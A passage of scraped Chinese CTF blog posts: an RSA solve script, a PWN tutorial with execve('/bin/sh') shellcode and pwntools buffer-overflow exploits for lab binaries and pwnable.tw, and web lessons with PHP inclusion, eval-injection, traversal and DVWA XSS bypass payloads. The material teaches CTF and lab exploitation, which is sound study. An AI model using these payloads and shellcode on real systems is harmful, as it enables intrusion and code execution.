1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env pythonimport base64import gmpy2f = open('n2&amp;n3', 'rb')n2 = f.readline()n3 = f.readline()f.close()n2 = base64.b64decode(n2).encode('hex')n3 = base64.b64decode(n3).encode('hex')n2 = int(n2, 16)n3 = int(n3, 16)# print 'n2:', n2# print 'n3:', n3# first step: solve n1e1 = 0x1001e2 = 0x101f = open('n1.encrypted', 'rb')n1_c1 = f.readline()n1_c2 = f.readline()f.close()n1_c1 = int(n1_c1, 16)n1_c2 = int(n1_c2, 16)# print 'n1_c1:', n1_c1# print 'n1_c2:', n1_c2gcd, s, t = gmpy2.gcdext(e1, e2)if s &lt; 0: s = abs(s) n1_c1 = gmpy2.invert(n1_c1, n3)if t &lt; 0: t = abs(t) n1_c2 = gmpy2.invert(n1_c2, n3)n1 = gmpy2.powmod(n1_c1, s, n3) * gmpy2.powmod(n1_c2, t, n3) % n3print 'n1:', n1# second step: solve flagf = open('ciphertext', 'rb')c1 = f.readline()c2 = f.readline()f.close()c1 = int(c1, 16)c2 = int(c2, 16)print 'c1:', c1print 'c2:', c2e = 0x1001p1 = gmpy2.gcd(n1, n2)p2 = n1 / p1p3 = n2 / p1d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))m1 = pow(c1, d1, n1)m2 = pow(c2, d2, n2)msg1 = hex(m1)[2:].decode('hex')msg2 = hex(m2)[2:].decode('hex')flag = ''for i in range(len(msg1 + msg2)): if i % 2 == 0: flag += msg1[i / 2] else: flag += msg2[i / 2]print 'flag:', flag 参考网站https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/https://www.xmsec.cc/stackoverflow-ropbasic/https://blog.csdn.net/xuchen16/article/details/81080580https://blog.csdn.net/xuchen16/article/details/81064079http://www.freebuf.com/column/177864.htmlhttps://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/http://www.cnblogs.com/semishigure/p/9318258.htmlhttps://blog.csdn.net/qq_33438733/article/details/81137057","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"PWN入门（三）","slug":"PWN入门（三）","date":"2018-07-11T00:50:39.000Z","updated":"2019-08-26T05:53:15.310Z","comments":true,"path":"2018/07/11/PWN入门（三）/","link":"","permalink":"blog.b3ale.cn/2018/07/11/PWN入门（三）/","excerpt":"Shellcode’s Magic&amp;Basic ROP.","text":"Shellcode’s Magic&amp;Basic ROP. shellcode 是一段用于利用软件漏洞而执行的代码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。 系统调用（int 0x80） NAME EAX EBX ECX EDX sys_exit 1 int 0 0 sys_read 3 unsigned int char * size_t sys_write 4 unsigned int const_char * size_t sys_open 5 const char * int int sys_execve 11 struct pt_regs 0 0 PS：最常用的为 11 号调用。也就是execve(&quot;/bin/sh&quot;,0,0)。 编写 ShellCode自己编写 shellcode 的优点是灵活、可以随机应变。 坏字符Shellcode 中存在 0x00 字节在进行利用的时候会被截断。Shellcode 如果存储在堆或是栈的内存中，这样在 shellcode 执行时就不能出现 0x00 这样的阶段字符。 \\x00在执行MOV EAX,5时，相当于MOV EAX,0x00000005，即会产生0x00，可以使用MOV AL,5来绕过 \\x0A绕过可以通过!@#$%。 EBX 中的参数（/bin/sh）一般做法是压入栈后取 ESP： 123PUSH 0x68732F2FPUSH 0x6E69622FMOV EBX,ESP 前两段十六进制转换成 ascii 码是：hs//nib/，取 ESP 的值到 EBX 中后，EBX 的值即为：字符串/bin//sh的首地址。 PS：在多级目录下，多个斜杠是对路径没有影响的。 nasm 反汇编工具下载Netwide Assembler 是一款基于英特尔 x86 架构的汇编与反汇编工具。它可以用来编写 16 位、32 位（IA-32）和 64 位（x86-64）的程序。 NASM 被认为是 Linux 平台上最受欢迎的汇编工具之一。 sudo apt-get install nasm报错记录一下无法下载时的解决方法。 使用ps -A | grep apt命令来找出所有apt进程。 使用sudo kill -9 {进程编号}来逐个杀死进程。 结束所有进程后即可下载。 完整编写过程写入文件shellcode.asm： 1234567891011Section .text global _start_start: xor ecx,ecx mul ecx push ecx push 0x68732f2f push 0x6e69622f mov ebx,esp mov al,0xb int 0x80 PS：关于这两条指令：XOR ECX,ECX =&gt; MUL ECX，经过测试，会先将 ECX 中的值置零，然后 EAX、EDX 中的值也都会变为零。 执行命令：nasm -f elf shellcode.asm -o shellcode.o后，使用objdump命令对shellcode.o进行反汇编：objdump -d shellcode.o。 将十六进制部分记录下来，就构成了一条 shellcode：\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80。 ROP面向返回编程（Return-Oriented Programming）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为 Gadgets）。每一段 gadget 通常结束于 return 指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。 相关保护机制NX 即 No-eXecute（不可执行）的意思，NX（类似于 windows 下的 DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。 PS： No eXecute（NX） =&gt; linux Data Execution Prevention（DEP） =&gt; windows 也就是说：“可执行不可写，可写不可执行。” ASLRAddress Space Layout Randomization（地址空间布局随机化），该技术在 2005 年的 kernel2.6.12 中被引入到 Linux 系统，它将进程的某些内存空间地址进行随机化来增大入侵者预测目的地址的难度，从而降低进程被成功入侵的风险。当前 Linux、Windows 等主流操作系统都已经采用该项技术。 分级： 0：没有随机化。即关闭 ASLR。 1：保留的随机化。共享库、栈、mmap()以及 VDSO 将被随机化。 2：完全的随机化。在 1 的基础上，通过brk()分配的内存空间也将被随机化。 PS： ASLR 并不负责 BSS 段、代码段（文本段）和数据段（DATA 段）的随机化。 堆栈空间被完全随机化。 7-11源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A()&#123; setvbuf(stdout, 0, _IONBF, 0); srand(time(0) ^ getpid()); char buf[100]; gets(buf); int magic = rand(); if (atoi(buf) == magic) &#123; puts(\"Okay...\"); system(\"sh\"); &#125;&#125;int main()&#123; A();&#125; 这道题和之前的一题很类似，但是将 buf 和 magic 两个变量的位置进行了调换，所以无法通过直接覆盖 magic 的值来 getshell。（当然还有一种方法时直接获得system(&quot;sh&quot;);的地址来 getshell） 简单难度此时 ASLR 是关闭的。 基本的想法是先填入 shellcode，然后通过 ret 的偏移量来跳转到 shellcode 的首地址，执行execve(&quot;/bin/sh&quot;,0,0)来 getshell。 shellcode 在之前已经写好了，偏移量也可以通过之前缓冲区溢出的方法来得到。 最后应该如何获得 shellcode 的首地址？可以通过如下 payload 来获取。 12345678910# test.pyfrom pwn import *p = process('./7-11')raw_input() # 相当于设下断点shellcode=p32(0xdeadbeef)+\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"addr=p32(0x12345678)offset=116payload=shellcode+(offset-len(shellcode))*'A'+addrp.sendline(payload)p.interactive() 这里在 shellcode 前加上“0xdeadbeef”，是为了之后在调试时更方便地找到首地址。raw_input()要求输入值，可以使程序在运行时终止，相当于一个断点。 运行 test.py，会得到该程序的 PID，用 gdb 的 attach 命令执行它。 在运行程序处随便输入值，然后在 gdb 中用 finish 命令使程序执行到gets()函数结束，再用 searchmem 命令查找“0xdeadbeef”的地址，即得到 shellcode 的首地址。 最后的 exp 如下： 12345678910# 7-11.pyfrom pwn import *p = process('./7-11')shellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"addr=p32(0xffffcfa8)offset=116# payload=shellcode+(offset-len(shellcode))*'A'+addrpayload=shellcode.ljust(offset,'A')+addrp.sendline(payload)p.interactive() 中等难度通过命令sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;，打开 ASLR。 通过之前的了解，当 ASLR 开启时，堆栈的地址是随机的，而 BSS 的地址是不变的，那么通过 BSS 段可以做一些文章。 PS：BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。其特点是可读写，且在程序执行之前会自动清 0。 总体的思路是利用 BSS 段地址不变的特性，构造 payload：payload=offset*&#39;A&#39;+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)（因为 BSS 段开头部分可能存储一些重要数据，故增加 0x100 来避免影响程序）。第一个 BSS 首地址表示gets()的返回地址，第二个 BSS 首地址表示gets()的参数。 那么通过 payload 可知，程序执行时会重新返回到gets()函数处，调用函数时，相当于先Push retaddr再Jump，即第一个 BSS 首地址为函数返回地址，再输入 shellcode 作为函数参数，即第二个 BSS 首地址。 使用 gdb 对程序调试，用 vmmap 命令查看 bss 段： 记录下 bss 段地址。通过objdump -d查看gets()函数地址： 两个地址都搞定后，那么就可以写出 exp 了： 12345678910111213from pwn import *# p = remote('10.21.13.88',1025)p = process('./7-11')shellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"offset=116bss=0x0804a000gets_addr=0x08048400payload=offset*'A'+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)p.sendline(payload)# gdb.attach(p,'''# ''') //在运行脚本时可以直接打开gdb进行调试p.sendline(shellcode)p.interactive() pwnable.tw-startchecksec 一下，发现保护都没开： 123456[*] &apos;/home/assassinq/Desktop/start&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 反编译出来只有_start和_exit，应该是个汇编程序。可以通过系统调用判断出调用的函数： 12345678910111213141516171819202122232425262728293031323334./start: file format elf32-i386Disassembly of section .text:08048060 &lt;_start&gt;: 8048060: 54 push esp 8048061: 68 9d 80 04 08 push 0x804809d 8048066: 31 c0 xor eax,eax 8048068: 31 db xor ebx,ebx 804806a: 31 c9 xor ecx,ecx 804806c: 31 d2 xor edx,edx 804806e: 68 43 54 46 3a push 0x3a465443 8048073: 68 74 68 65 20 push 0x20656874 8048078: 68 61 72 74 20 push 0x20747261 804807d: 68 73 20 73 74 push 0x74732073 8048082: 68 4c 65 74 27 push 0x2774654c 8048087: 89 e1 mov ecx,esp 8048089: b2 14 mov dl,0x14 804808b: b3 01 mov bl,0x1 804808d: b0 04 mov al,0x4 ; sys_write 804808f: cd 80 int 0x80 8048091: 31 db xor ebx,ebx 8048093: b2 3c mov dl,0x3c 8048095: b0 03 mov al,0x3 ; sys_read 8048097: cd 80 int 0x80 8048099: 83 c4 14 add esp,0x14 804809c: c3 ret0804809d &lt;_exit&gt;: 804809d: 5c pop esp 804809e: 31 c0 xor eax,eax 80480a0: 40 inc eax 80480a1: cd 80 int 0x80 具体寄存器的值与系统调用的关系： 寄存器 作用 eax 中断类型号 ebx STDIN/STDOUT ecx 字符串地址 edx 字符串长度 因为栈是可执行的并且开启了 ASLR。我们的想法就是通过泄漏栈地址，然后填入 shellcode，跳转过去 getshell。 exp 如下： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./start')else: p = remote('139.162.123.119', 10000)write = 0x8048087# gdb.attach(p)offset = 20payload = 'A' * offset + p32(write)p.sendafter('CTF:', payload)stack = u32(p.recv(4)) + 0x10print 'stack:', hex(stack)sh = open('sh.bin').read()payload = 'A' * 20 + p32(stack + 4) + shp.send(payload)p.interactive() 参考网站https://linux.cn/article-8040-1.htmlhttp://bestwing.me/2017/03/19/stack-overflow-two-ROP/https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/https://blog.csdn.net/white_eyes/article/details/7169199https://b3t4m3ee.github.io/2018/07/10/Shellcode-s-Magic/https://blog.csdn.net/Plus_RE/article/details/79199772http://showlinkroom.me/2017/01/22/pwnable-tw/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"WEB入门（五）","slug":"WEB入门（五）","date":"2018-07-10T09:10:35.000Z","updated":"2019-08-26T05:48:16.106Z","comments":true,"path":"2018/07/10/WEB入门（五）/","link":"","permalink":"blog.b3ale.cn/2018/07/10/WEB入门（五）/","excerpt":"PHP 伪协议和文件包含。","text":"PHP 伪协议和文件包含。 PHP 伪协议不是指网络上的TCP/IP 协议，而是操作系统提供支持的一种协议，类似标准协议 HTTP、FTP。自定义协议叫做伪协议。 伪协议格式：zzz://xxxxxx。 PHP 伪协议总和 形式 作用 file:// 访问本地文件系统 http:// 访问 HTTP(s) 网址 ftp:// 访问 FTP(s) URLs php:// 访问各个输入/输出（I/Ostreams） zlib:// 压缩流 data:// 数据（RFC 2397） glob:// 查找匹配的文件路径模式 phar:// PHP 归档 ssh2:// Secure Shell 2 rar:// RAR ogg:// 音频流 expect:// 处理交互式的流 配置 allow_url_fopen：能否远程文件包含 allow_url_include：能否使用伪协议 PHP 伪协议应用php://filter形式：?file=php://filter/convert.base64-encode/resource=xxx.php php://filter是一种元封装器，设计用于“数据流打开”时的“筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include。 应用点击跳转页面后，通过伪协议读取源码： 源码解密后得到 flag： 变量覆盖漏洞（extract()）int extract(array &amp;$var_array, int $extract_type = EXTR_OVERWRITE, string $prefix = null) extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 第二个参数type用于指定当某个变量已经存在，而数组中又有同名元素时，extract()函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。 extract(array,extract_rules,prefix) extract_rules 的默认值为 EXTR_OVERWRITE，表示如果有冲突，则覆盖已有的变量。 应用（lianxi-input1）源码： 123456789101112&lt;?php$flag='xxxxx';extract($_GET);if(isset($shiyan)&#123; $content=trim($flag); if($shiyan==$content) echo'flag&#123;......&#125;'; else echo'Oh.no';&#125;?&gt; 通过extract()变量覆盖，构造 payload?shiyan=1&amp;flag=1得到 flag。 file_get_contents()file_get_contents()函数把整个文件读入一个字符串中。 应用（lianxi-data）源码： 12345678&lt;?php$user=$_GET['user'];#echo $user;if(isset($user)&amp;&amp;(file_get_contents($user,'r')==='the user is admin')) echo \"flag&#123;xxxxxxxxxxxxx&#125;\";else echo \"you are not admin ! \";?&gt; 分别通过 GET 和 POST 两种方式获得 flag： 应用四先根据提示查看 php.ini 配置情况 发现可以通过伪协议来执行代码，先获得根路径： 再通过scandir()函数来扫根路径就能找到 flag 路径，直接访问就得到 flag。 eval()闭合漏洞eval()函数可以执行函数内部字符串所构成的指令。通过闭合前后的括号可以达到执行其他命令的效果。 应用（lianxi-excute）源码： 123456 &lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; 构造 payload：);print_r(file(&quot;./flag.php&quot;) 即eval(&quot;var_dump();print_r(file(&quot;./flag.php&quot;));&quot;); 应用六源码： 12345678 &lt;?php show_source(__FILE__); if(isset($_REQUEST['path']))&#123; include($_REQUEST['path']); &#125;else&#123; include('phpinfo.php'); &#125;?&gt; 先通过伪协议扫描当前目录：&lt;?php print_r(scandir(&quot;.&quot;)); ?&gt; 直接访问 flag.php 得到 flag。 phar://phar://是数据流包装器，自 PHP5.3.0 起开始有效，也是 php 的一个函数，功能是解压还原。 应用在 php 文件中写入&lt;?php phpinfo(); ?&gt;，将文件压缩后修改后缀名为jpg。 上传文件后构造 payload：http://127.0.0.1/lianxi/phar1/include.php?file=phar://upload/11.jpg/11。 PHP 文件包含漏洞在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web 根目录以外的文件进来，就会导致文件信息的的泄漏甚至注入了恶意代码 分类 远程文件包含（RFI）：?file=http://file/text.txt 本地文件包含（LFI）：?file=../text.txt PHP 文件包含的几个函数 include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。 include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序至调用一次。 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。 require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 %00截断（在 PHP5.3.4 之前有效）在$_GET[&quot;filename&quot;]中常见 形式：filename=test.php%00.txt 主要利用：上传时路径必须为 上传路径必须为 txt、png 等结尾时 文件下载时，绕过白名单检查 文件包含时，截断后面限制（主要是文件包含时） PS：PHP 配置中magic_quotes_gpc=Off，即没有对数据进行转义解析。 从根目录搜寻/../../../../../../www/dvwa/php.ini 前面必须加/，表示从根目录开始。 双写重构造str_replace(array(&quot;../&quot;,&quot;..\\&quot;),&quot;&quot;,$file); payload：?page=/..././..././www/dvwa/php.ini file 包含file://协议（本地包含文件）：将绝对路径下的文件包含进来。 漏洞利用： 上传一个内容为php的文件 利用file协议取包含上传文件（需要知道上传文件的绝对路径） 实现任意命令执行 PHP 相关函数整理 函数 功能 extract() 从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 isset() 检测变量是否设置，并且不是 NULL。 trim() 移除字符串两侧的空白字符或其他预定义字符。 file_get_contents() 用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。 print_r() 显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。 scandir() 返回指定目录中的文件和目录的数组。 phpinfo() 输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 授权信息(License)。 eval() 把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。 var_dump() 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。 include() 获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。 show_source() 对文件进行语法高亮显示。 参考网站http://vinc.top/2016/09/28/%E3%80%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/https://lightless.me/archives/include-file-from-zip-or-phar.htmlhttps://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"WEB入门（四）","slug":"WEB入门（四）","date":"2018-07-08T01:08:01.000Z","updated":"2019-08-26T05:48:58.536Z","comments":true,"path":"2018/07/08/WEB入门（四）/","link":"","permalink":"blog.b3ale.cn/2018/07/08/WEB入门（四）/","excerpt":"涛哥带我学 XSS。","text":"涛哥带我学 XSS。 基础知识HTML一种超文本标记语言。其结构包括头部分（Head）和主体部分（Body），其中头部提供关于网页的信息，主体部分提供网页的具体内容。由 HTML 各类标签组成。 各类标签： 标签 功能 img 插入图片 body 文档的主体 iframe 在网页显示网页 Javascript一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为 JavaScript 引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在 HTML 网页上使用，用来给 HTML 网页增加动态功能。 cookie 与 session会话（Session）跟踪是 Web 程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是 Cookie 与 Session。Cookie 通过在客户端记录信息确定用户身份，Session 通过在服务器端记录信息确定用户身份。 WAFWeb 应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。国际上公认的一种说法是：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。 Javascript 弹框操作Javascript 函数内嵌实现形式：&lt;script&gt;Javascript的函数&lt;/script&gt; 相关函数： alert()：用于提示 confirm()：用于和用户交互确认 prompt()：弹框让用户输入信息 XSS跨站脚本攻击（cross site script execution），一种出现在 web 应用程序中的计算机安全漏洞。由于 web 应用对用户的输入过滤不严而产生。恶意攻击者通过 HTML 注入篡改网页，插入恶意脚本，从而控制用户浏览器行为的一种攻击方式。 危害 网络钓鱼，包括盗取各类的用户账号 窃取用户 cookie 强制弹出广告页面，刷流量 页面挂马 提升用户权限，进一步渗透网站 传播扩展脚本蠕虫 相比于 SQL 注入，SQL 注入是对后端的恶意篡改，而 XSS 是对前端的恶意攻击。 反射型 XSS也称为非持久性、参数型跨站脚本。主要用于将恶意的脚本附加到 URL 地址的参数中。 一般使用的已经构造好的恶意 URL 发送给受害者，诱使受害者点击触发，只执行一次。 存储型 XSS比反射型跨站脚本更具威胁，并且可能影响到 web 服务器的自身安全。 攻击者事先将恶意 JavaScript 代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。 绕过 XSS 限制 绕过magic_quotes_gpc（通过String.fromCharCode()函数） HEX 编码 改变大小写 关闭标签（&gt;&lt;script&gt;slert(&#39;xss&#39;);&lt;/script&gt;）（闭合前面的标签） 相关 PHP 函数 str_replace()：以其他字符替换字符串中的一些字符（区分大小写） addslashes()：在预定义字符（&#39;、&quot;、\\、NULL）之前添加反斜杠 stripslashes()：删除由addslashes()函数添加的反斜杠 trim()：移除字符串两侧的空白字符或其他预定义字符 htmlspecialchars()：把预定义的字符转换为 HTML 实体（&amp;（和号）成为&amp;；&quot;（双引号）成为&quot;；&#39;（单引号）成为 ‘；&lt;（小于）成为&lt;；&gt;（大于）成为&gt;） htmlspecialchars_decode()：把预定义的 HTML 实体转换为字符 mysql_real_escape_string()：对字符串中的特殊符号（\\x00、\\n、\\r、\\、&#39;、&quot;、\\x1a）进行转义 strip_tags()：剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用标签 DVWA 之 XSS今天在这里遇到了两个坑记录一下。 发现 Metasploitable 中的 DVWA 版本有点新，High Level 竟然就是 Impossible Level。最后还是用了以前 PHPSTUDY 里的旧版本来实验。 还有就是重置数据库的时候出现了无法删除 dvwa 数据库的错误。在命令行和图形界面都删除不了，最后直接去 mysql 目录下删除，才可以重置。 实验中主要根据源码分析被过滤的部分，寻找绕过的方法。 XSS Reflected（反射型 XSS）反射型相对简单一些。 Low源码： 1234567&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 这里显然对输入内容没有任何过滤。直接输入&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;就有弹窗回显。 Medium源码： 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 这里通过str_replace函数，将字符串&lt;script&gt;替换成空串，故只要双写或是大小写混用即可绕过。 构造 payload&lt;SCript&gt;alert(&#39;1&#39;)&lt;/script&gt;或者&lt;scri&lt;script&gt;pt&gt;alert(&#39;1&#39;)&lt;/script&gt;。 High源码： 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 源码中将所有的&lt;script&gt;完全过滤了（正则表达式中/i表示不区分大小写），使用&lt;script&gt;标签没有任何作用，所以需要通过其他方式。 在 HTML 的标签中，img、body、iframe 等标签的 src 注入恶意代码。payload 为：&lt;img src=1 onerror=alert(&quot;1&quot;) /&gt;（onerror事件会在文档或图像加载过程中发生错误时被触发。在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。） Impossible源码： 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里使用了htmlspecialchars()函数，将输入的恶意代码转换成 HTML 实体，完全过滤了恶意代码，无法进行攻击。 XSS Stored（存储型 XSS）存储型大多数存在留言板中，留言板又一般存在几个文本输入框。每个输入框都可以测试一下是否存在 XSS。 每次成功弹窗后，恶意代码都会被存储到数据库中，所以每次进入该页面都会出现之前的弹窗。 Low源码： 12345678910111213141516&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 源码中对 name 和 message 处的信息没有做任何过滤，故可以直接尝试 xss。 在 message 一栏直接输入&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;就可以出发弹窗。在 name 一栏中有字数长度限制，故用 burpsuite 抓包之后，再修改 name 栏中的字符串为&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;，放包后触发弹窗。 Medium源码： 12345678910111213141516 &lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = trim(strip_tags(addslashes($message))); $message = mysql_real_escape_string($message); $message = htmlspecialchars($message); // Sanitize name input $name = str_replace('&lt;script&gt;', '', $name); $name = mysql_real_escape_string($name); $query = \"INSERT INTO guestbook (comment,name) VALUES ('$message','$name');\"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );&#125;?&gt; 这里和前一题一样，通过str_replace函数，将字符串&lt;script&gt;替换成空串。 name 处可以继续通过抓包来进行 XSS。而 message 处输入的内容被htmlspecialchars()函数过滤，不存在 XSS。 High源码： 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // 